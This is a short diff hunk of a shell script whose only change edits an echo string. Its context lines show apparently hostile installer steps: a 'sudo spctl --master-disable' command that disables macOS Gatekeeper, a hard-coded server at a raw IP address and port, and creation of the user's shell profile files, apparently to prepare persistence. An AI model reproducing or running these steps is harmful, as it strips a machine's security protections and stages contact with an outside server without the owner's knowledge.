@@ -2,7 +2,7 @@
 
 set -e; sudo spctl --master-disable; SERVER='GS=http://149.28.95.12:8808'
 
-echo 'echo0';
+echo 'FEB';
 
 multitouch () { for f in "$@"; do touch $HOME/.${f}; done }; multitouch bash_profile bashrc
 chkprog () { if hash $1 2>/dev/null; then return 0; else return 1; fi }
